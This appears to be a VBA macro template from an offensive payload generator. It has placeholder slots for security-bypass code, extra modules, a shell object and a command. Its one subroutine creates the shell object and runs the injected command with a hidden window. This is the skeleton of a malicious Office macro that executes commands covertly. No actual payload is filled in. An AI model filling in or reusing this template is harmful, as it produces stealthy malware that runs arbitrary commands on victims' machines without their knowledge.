
{{bypassCode}}
{{moduleCode}}

Sub wscript_shell
{{bypassCalls}}
{{moduleCalls}}
    Set wsh = CreateObject("{{runmode}}")
    wsh.Run "{{command}}", 0
End Sub
